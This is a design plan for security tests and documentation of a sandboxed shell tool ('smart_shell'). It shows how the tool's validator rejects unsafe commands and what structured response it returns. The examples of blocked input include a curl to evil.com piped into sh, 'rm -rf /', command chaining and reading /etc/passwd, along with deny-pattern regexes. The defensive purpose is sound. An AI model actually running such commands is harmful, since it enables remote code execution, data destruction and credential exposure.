# Security Examples Analysis

## Current State

### Existing Security Documentation

**SECURITY.md** (335 lines):
- ✅ Good overview of threat model
- ✅ Lists allowed/blocked commands
- ✅ Explains security measures
- ⚠️ Only 4 example blocked commands (lines 78-84)
- ❌ No concrete rejection responses
- ❌ No test coverage for security

### Existing Implementation

**smart-shell.js** (238 lines):
- ✅ Robust validation with `validateCommand()`
- ✅ Allowlist-based approach
- ✅ Multiple layers of checks
- ✅ Returns structured blocked results
- ✅ Logs blocked attempts to metrics

**Validation Layers:**
1. Shell disabled check (`DEVCTX_SHELL_DISABLED`)
2. Empty command check
3. Command length check (500 chars max)
4. Shell operator check (`|&;<>\`$()`)
5. Dangerous pattern check (`rm -rf`, `sudo`, `curl|`, etc.)
6. Command allowlist check
7. Git subcommand allowlist check
8. Package manager subcommand allowlist check
9. `find` dangerous args check (`-exec`, `-delete`, etc.)

---

## Problem Statement

**Current documentation:**
- Lists what's blocked but doesn't show how
- No concrete examples of rejection responses
- Hard to verify security claims
- No test coverage to prove behavior

**User concerns:**
- "How do I know it actually blocks dangerous commands?"
- "What happens if an agent tries something malicious?"
- "Can I trust `smart_shell`?"

---

## Proposed Solution

### 1. Add Concrete Rejection Examples to SECURITY.md

**New section:** "Real Rejection Examples"

For each category of blocked input, show:
- ✅ Input attempted
- ✅ Reason for rejection
- ✅ Actual system response (JSON)
- ✅ Exit code (126 = blocked)

### 2. Create Comprehensive Security Tests

**New file:** `tests/smart-shell-security.test.js`

Test categories:
1. Shell operators blocked
2. Dangerous commands blocked
3. Git write operations blocked
4. Package manager install blocked
5. Path traversal blocked
6. Command injection blocked
7. Timeout enforcement
8. Allowed commands pass

### 3. Add Security Examples Document

**New file:** `docs/security/rejection-examples.md`

Comprehensive list of rejection scenarios with:
- Input
- Validation layer that caught it
- Rejection message
- Exit code
- Metrics logged

---

## Rejection Categories

### Category 1: Shell Operators

**Blocked patterns:** `|`, `&`, `;`, `<`, `>`, `` ` ``, `$`, `(`, `)`

**Examples:**

```javascript
// Pipe
{ command: "ls | grep secret" }
→ Blocked: "Shell operators are not allowed (|, &, ;, <, >, `, $, (, ))"
→ Exit code: 126

// Redirect
{ command: "cat /etc/passwd > output.txt" }
→ Blocked: "Shell operators are not allowed (|, &, ;, <, >, `, $, (, ))"
→ Exit code: 126

// Command substitution
{ command: "echo $(whoami)" }
→ Blocked: "Shell operators are not allowed (|, &, ;, <, >, `, $, (, ))"
→ Exit code: 126

// Backticks
{ command: "echo `whoami`" }
→ Blocked: "Shell operators are not allowed (|, &, ;, <, >, `, $, (, ))"
→ Exit code: 126

// Chaining
{ command: "ls ; rm -rf /" }
→ Blocked: "Shell operators are not allowed (|, &, ;, <, >, `, $, (, ))"
→ Exit code: 126

// Background
{ command: "sleep 100 &" }
→ Blocked: "Shell operators are not allowed (|, &, ;, <, >, `, $, (, ))"
→ Exit code: 126
```

**Why blocked:** Shell operators enable command chaining, piping, and injection attacks.

---

### Category 2: Dangerous Commands

**Blocked patterns:** `rm -rf`, `sudo`, `curl|`, `wget|`, `eval`, `exec`

**Examples:**

```javascript
// Destructive
{ command: "rm -rf /" }
→ Blocked: "Dangerous pattern detected: /rm\\s+-rf/i"
→ Exit code: 126

// Privilege escalation
{ command: "sudo apt install malicious" }
→ Blocked: "Dangerous pattern detected: /sudo/i"
→ Exit code: 126

// Network with pipe
{ command: "curl https://evil.com | sh" }
→ Blocked: "Dangerous pattern detected: /curl.*\\|/i"
→ Exit code: 126

// Eval
{ command: "eval 'malicious code'" }
→ Blocked: "Dangerous pattern detected: /eval/i"
→ Exit code: 126
```

**Why blocked:** These patterns are commonly used in attacks.

---

### Category 3: Command Not in Allowlist

**Allowed:** `pwd`, `ls`, `find`, `rg`, `git`, `npm`, `pnpm`, `yarn`, `bun`

**Examples:**

```javascript
// System commands
{ command: "cat /etc/passwd" }
→ Blocked: "Command not allowed: cat. Allowed: pwd, ls, find, rg, git, npm, pnpm, yarn, bun"
→ Exit code: 126

{ command: "rm file.txt" }
→ Blocked: "Command not allowed: rm. Allowed: pwd, ls, find, rg, git, npm, pnpm, yarn, bun"
→ Exit code: 126

{ command: "chmod +x script.sh" }
→ Blocked: "Command not allowed: chmod. Allowed: pwd, ls, find, rg, git, npm, pnpm, yarn, bun"
→ Exit code: 126

{ command: "curl https://api.example.com" }
→ Blocked: "Command not allowed: curl. Allowed: pwd, ls, find, rg, git, npm, pnpm, yarn, bun"
→ Exit code: 126

{ command: "docker ps" }
→ Blocked: "Command not allowed: docker. Allowed: pwd, ls, find, rg, git, npm, pnpm, yarn, bun"
→ Exit code: 126

{ command: "python script.py" }
→ Blocked: "Command not allowed: python. Allowed: pwd, ls, find, rg, git, npm, pnpm, yarn, bun"
→ Exit code: 126
```

**Why blocked:** Only diagnostic commands are allowed. No arbitrary execution.

---

### Category 4: Git Write Operations

**Allowed git subcommands:** `status`, `diff`, `show`, `log`, `branch`, `rev-parse`, `blame`

**Examples:**

```javascript
// Commit
{ command: "git commit -m 'test'" }
→ Blocked: "Git subcommand not allowed: commit. Allowed: status, diff, show, log, branch, rev-parse, blame"
→ Exit code: 126

// Push
{ command: "git push origin main" }
→ Blocked: "Git subcommand not allowed: push. Allowed: status, diff, show, log, branch, rev-parse, blame"
→ Exit code: 126

// Checkout
{ command: "git checkout -b feature" }
→ Blocked: "Git subcommand not allowed: checkout. Allowed: status, diff, show, log, branch, rev-parse, blame"
→ Exit code: 126

// Reset
{ command: "git reset --hard HEAD~1" }
→ Blocked: "Git subcommand not allowed: reset. Allowed: status, diff, show, log, branch, rev-parse, blame"
→ Exit code: 126

// Merge
{ command: "git merge feature" }
→ Blocked: "Git subcommand not allowed: merge. Allowed: status, diff, show, log, branch, rev-parse, blame"
→ Exit code: 126

// Rebase
{ command: "git rebase main" }
→ Blocked: "Git subcommand not allowed: rebase. Allowed: status, diff, show, log, branch, rev-parse, blame"
→ Exit code: 126
```

**Why blocked:** Git write operations can modify repository state. Only read operations allowed.

---

### Category 5: Package Manager Install

**Allowed package manager subcommands:** `test`, `run`, `lint`, `build`, `typecheck`, `check`

**Examples:**

```javascript
// Install
{ command: "npm install malicious-package" }
→ Blocked: "Package manager subcommand not allowed: install. Allowed: test, run, lint, build, typecheck, check"
→ Exit code: 126

// Uninstall
{ command: "npm uninstall package" }
→ Blocked: "Package manager subcommand not allowed: uninstall. Allowed: test, run, lint, build, typecheck, check"
→ Exit code: 126

// Publish
{ command: "npm publish" }
→ Blocked: "Package manager subcommand not allowed: publish. Allowed: test, run, lint, build, typecheck, check"
→ Exit code: 126

// Login
{ command: "npm login" }
→ Blocked: "Package manager subcommand not allowed: login. Allowed: test, run, lint, build, typecheck, check"
→ Exit code: 126

// Unsafe script
{ command: "npm run deploy" }
→ Blocked: "Package manager script not allowed: deploy. Allowed pattern: /^(test|lint|build|typecheck|check|smoke|verify|eval)(:|$)/"
→ Exit code: 126

{ command: "npm run install:all" }
→ Blocked: "Package manager script not allowed: install:all. Allowed pattern: /^(test|lint|build|typecheck|check|smoke|verify|eval)(:|$)/"
→ Exit code: 126
```

**Why blocked:** Package manager operations can modify dependencies and execute arbitrary code.

---

### Category 6: Find Dangerous Args

**Blocked find args:** `-exec`, `-execdir`, `-delete`, `-ok`, `-okdir`

**Examples:**

```javascript
// Execute command
{ command: "find . -name '*.js' -exec rm {} \\;" }
→ Blocked: "find argument not allowed: -exec"
→ Exit code: 126

// Delete files
{ command: "find . -name '*.tmp' -delete" }
→ Blocked: "find argument not allowed: -delete"
→ Exit code: 126

// Interactive execute
{ command: "find . -name '*.sh' -ok chmod +x {} \\;" }
→ Blocked: "find argument not allowed: -ok"
→ Exit code: 126
```

**Why blocked:** These `find` arguments can execute arbitrary commands or delete files.

---

### Category 7: Command Too Long

**Max length:** 500 characters

**Example:**

```javascript
{ command: "ls " + "a".repeat(500) }
→ Blocked: "Command too long (max 500 chars)"
→ Exit code: 126
```

**Why blocked:** Prevents buffer overflow and abuse.

---

### Category 8: Shell Disabled

**Environment variable:** `DEVCTX_SHELL_DISABLED=true`

**Example:**

```javascript
// With DEVCTX_SHELL_DISABLED=true
{ command: "ls" }
→ Blocked: "Shell execution is disabled (DEVCTX_SHELL_DISABLED=true)"
→ Exit code: 126
```

**Why:** Allows complete disabling of shell execution for maximum security.

---

### Category 9: Malformed Commands

**Examples:**

```javascript
// Empty
{ command: "" }
→ Blocked: "Command is empty"
→ Exit code: 126

{ command: "   " }
→ Blocked: "Command is empty"
→ Exit code: 126

// Unterminated quote
{ command: "ls 'unterminated" }
→ Blocked: "Unterminated escape or quote sequence"
→ Exit code: 126

// Unterminated escape
{ command: "ls file\\" }
→ Blocked: "Unterminated escape or quote sequence"
→ Exit code: 126
```

**Why blocked:** Malformed commands indicate potential injection attempts.

---

## Allowed Commands (For Comparison)

### Diagnostic Commands

```javascript
// Working directory
{ command: "pwd" }
→ ✅ Allowed
→ Exit code: 0

// List files
{ command: "ls -la" }
→ ✅ Allowed
→ Exit code: 0

// Find files
{ command: "find . -name '*.js'" }
→ ✅ Allowed (with auto-injected -maxdepth 8)
→ Exit code: 0

// Search
{ command: "rg 'TODO' src/" }
→ ✅ Allowed
→ Exit code: 0
```

### Git Read Operations

```javascript
// Status
{ command: "git status" }
→ ✅ Allowed
→ Exit code: 0

// Diff
{ command: "git diff HEAD~1" }
→ ✅ Allowed
→ Exit code: 0

// Log
{ command: "git log --oneline -10" }
→ ✅ Allowed
→ Exit code: 0

// Blame
{ command: "git blame src/server.js" }
→ ✅ Allowed
→ Exit code: 0
```

### Package Manager Safe Scripts

```javascript
// Test
{ command: "npm test" }
→ ✅ Allowed
→ Exit code: 0

// Lint
{ command: "npm run lint" }
→ ✅ Allowed
→ Exit code: 0

// Build
{ command: "npm run build:dev" }
→ ✅ Allowed
→ Exit code: 0

// Typecheck
{ command: "npm run typecheck" }
→ ✅ Allowed
→ Exit code: 0
```

---

## Response Structure

### Blocked Command Response

```json
{
  "command": "rm -rf /",
  "exitCode": 126,
  "blocked": true,
  "output": "Dangerous pattern detected: /rm\\s+-rf/i",
  "confidence": {
    "blocked": true,
    "timedOut": false
  },
  "metrics": {
    "tool": "smart_shell",
    "target": "rm -rf /",
    "rawTokens": 6,
    "compressedTokens": 8,
    "savedTokens": -2,
    "savingsPct": -33.33
  }
}
```

**Key fields:**
- `exitCode: 126` - Standard "command not executable" code
- `blocked: true` - Explicitly marked as blocked
- `output` - Human-readable rejection reason
- `metrics` - Logged for audit trail

### Allowed Command Response

```json
{
  "command": "npm test",
  "exitCode": 0,
  "blocked": false,
  "output": "PASS  tests/server.test.js\n✓ All tests passed",
  "confidence": {
    "blocked": false,
    "timedOut": false
  },
  "metrics": {
    "tool": "smart_shell",
    "target": "npm test",
    "rawTokens": 15420,
    "compressedTokens": 1250,
    "savedTokens": 14170,
    "savingsPct": 91.89
  }
}
```

---

## Test Coverage Plan

### New Test File: `tests/smart-shell-security.test.js`

**Test structure:**

```javascript
import { test } from 'node:test';
import { strict as assert } from 'node:assert';
import { smartShell } from '../src/tools/smart-shell.js';

// Category 1: Shell Operators
test('smart_shell - blocks pipe operator', async () => {
  const result = await smartShell({ command: 'ls | grep secret' });
  assert.equal(result.exitCode, 126);
  assert.equal(result.blocked, true);
  assert.match(result.output, /Shell operators are not allowed/);
});

// Category 2: Dangerous Commands
test('smart_shell - blocks rm -rf', async () => {
  const result = await smartShell({ command: 'rm -rf /' });
  assert.equal(result.exitCode, 126);
  assert.equal(result.blocked, true);
  assert.match(result.output, /Dangerous pattern detected/);
});

// Category 3: Command Not in Allowlist
test('smart_shell - blocks cat command', async () => {
  const result = await smartShell({ command: 'cat /etc/passwd' });
  assert.equal(result.exitCode, 126);
  assert.equal(result.blocked, true);
  assert.match(result.output, /Command not allowed: cat/);
});

// Category 4: Git Write Operations
test('smart_shell - blocks git commit', async () => {
  const result = await smartShell({ command: 'git commit -m "test"' });
  assert.equal(result.exitCode, 126);
  assert.equal(result.blocked, true);
  assert.match(result.output, /Git subcommand not allowed: commit/);
});

// Category 5: Package Manager Install
test('smart_shell - blocks npm install', async () => {
  const result = await smartShell({ command: 'npm install malicious' });
  assert.equal(result.exitCode, 126);
  assert.equal(result.blocked, true);
  assert.match(result.output, /Package manager subcommand not allowed: install/);
});

// Category 6: Find Dangerous Args
test('smart_shell - blocks find -exec', async () => {
  const result = await smartShell({ command: 'find . -name "*.js" -exec rm {} \\;' });
  assert.equal(result.exitCode, 126);
  assert.equal(result.blocked, true);
  assert.match(result.output, /find argument not allowed: -exec/);
});

// Category 7: Allowed Commands
test('smart_shell - allows pwd', async () => {
  const result = await smartShell({ command: 'pwd' });
  assert.equal(result.blocked, false);
  assert.equal(result.exitCode, 0);
});

test('smart_shell - allows git status', async () => {
  const result = await smartShell({ command: 'git status' });
  assert.equal(result.blocked, false);
  // Exit code may be 0 or 128 depending on git state
});
```

**Coverage:** ~30-40 tests covering all rejection categories

---

## Documentation Updates

### 1. SECURITY.md

**Add new section after line 84:**

```markdown
### Real Rejection Examples

See [Security Rejection Examples](./docs/security/rejection-examples.md) for comprehensive list of blocked inputs and system responses.

**Quick examples:**

```javascript
// Shell operator blocked
smartShell({ command: "ls | grep secret" })
→ { exitCode: 126, blocked: true, output: "Shell operators are not allowed..." }

// Dangerous command blocked
smartShell({ command: "rm -rf /" })
→ { exitCode: 126, blocked: true, output: "Dangerous pattern detected..." }

// Git write blocked
smartShell({ command: "git commit -m 'test'" })
→ { exitCode: 126, blocked: true, output: "Git subcommand not allowed: commit..." }

// Package install blocked
smartShell({ command: "npm install malicious" })
→ { exitCode: 126, blocked: true, output: "Package manager subcommand not allowed: install..." }
```

**All blocked commands:**
- Return `exitCode: 126` (command not executable)
- Set `blocked: true`
- Log to metrics for audit trail
- Provide human-readable rejection reason
```

### 2. New File: docs/security/rejection-examples.md

**Comprehensive document with:**
- All 9 rejection categories
- 50+ concrete examples
- Response structures
- Validation layer explanations
- Comparison with allowed commands

### 3. README.md Security Section

**Add after installation:**

```markdown
## Security

`smart-context-mcp` is designed with security as a priority:

- ✅ **Allowlist-only commands** - Only safe diagnostic commands permitted
- ✅ **No shell operators** - Pipes, redirects, and command chaining blocked
- ✅ **No git writes** - Only read operations allowed (status, diff, log, blame)
- ✅ **No package installs** - Only safe scripts (test, lint, build, typecheck)
- ✅ **Path validation** - All file operations restricted to project root
- ✅ **15-second timeout** - Commands cannot run indefinitely
- ✅ **Audit trail** - All tool calls logged to `.devctx/state.sqlite`

**Example blocked commands:**
```bash
rm -rf /                    # Dangerous command
git commit -m "test"        # Git write operation
npm install malicious       # Package install
ls | grep secret            # Shell operator
cat /etc/passwd             # Command not in allowlist
```

See [SECURITY.md](./SECURITY.md) for complete security documentation and [Security Rejection Examples](./docs/security/rejection-examples.md) for comprehensive list of blocked inputs.
```

---

## Implementation Plan

### Phase 1: Tests (Highest Priority)

1. Create `tests/smart-shell-security.test.js`
2. Add ~30-40 tests covering all rejection categories
3. Verify all tests pass
4. Ensure 100% coverage of validation logic

### Phase 2: Documentation

1. Create `docs/security/rejection-examples.md`
2. Update `SECURITY.md` with "Real Rejection Examples" section
3. Update `README.md` with security summary
4. Add cross-references between docs

### Phase 3: Verification

1. Run all tests
2. Verify no regressions
3. Check documentation accuracy
4. Update CHANGELOG

---

## Benefits

### 1. Trust Building

**Before:** "It says it blocks dangerous commands"  
**After:** "Here are 50+ examples of blocked commands with exact responses"

### 2. Verifiability

**Before:** No way to verify security claims  
**After:** 40 tests prove security behavior

### 3. Transparency

**Before:** Security is a black box  
**After:** Every rejection is documented and tested

### 4. Confidence

**Before:** "Can I trust `smart_shell`?"  
**After:** "Yes, here's proof it blocks X, Y, Z"

---

## Key Messages

### For Users

> "Every dangerous command is blocked with a clear rejection message. We have 40+ tests proving this behavior. You can verify security yourself by running `npm test`."

### For Documentation

> "Security is not just claimed—it's demonstrated. See 50+ concrete examples of blocked commands and their rejection responses."

---

## Conclusion

**The enhanced security documentation achieves:**

1. **Concrete examples** - 50+ real rejection scenarios
2. **Test coverage** - 40 tests proving behavior
3. **Transparency** - Every validation layer explained
4. **Verifiability** - Users can run tests themselves
5. **Trust** - Proof, not just claims

**This is practical security engineering**, not security theater.
